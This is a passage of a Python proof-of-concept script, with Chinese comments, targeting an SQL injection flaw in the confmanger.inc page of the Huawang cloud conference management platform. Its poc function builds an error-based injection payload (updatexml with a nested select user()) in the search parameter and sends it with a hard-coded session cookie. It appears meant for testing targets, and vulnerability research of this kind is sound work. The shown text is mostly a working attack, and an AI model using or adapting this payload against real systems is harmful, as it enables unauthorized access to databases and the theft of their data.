...
def main():
    banner()  # 打印欢迎界面
    parser = argparse.ArgumentParser(description="华望云会议管理平台confmanger.inc存在SQL注入漏洞")
...
def poc(target):
    # 构造payload的url
    payload = "/page/confmanger.inc?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+user())),1))+and+'%25%25'+like+'&params[]=confName&params[]=confId&params[]=displayName"
    url = target + payload
    headers = {
        'X-Requested-With': 'XMLHttpRequest',
        'Cookie': 'uid=112; JSESSIONID=8E8A139355E2047CEAC6B307396968A8; languageGlobal=1',
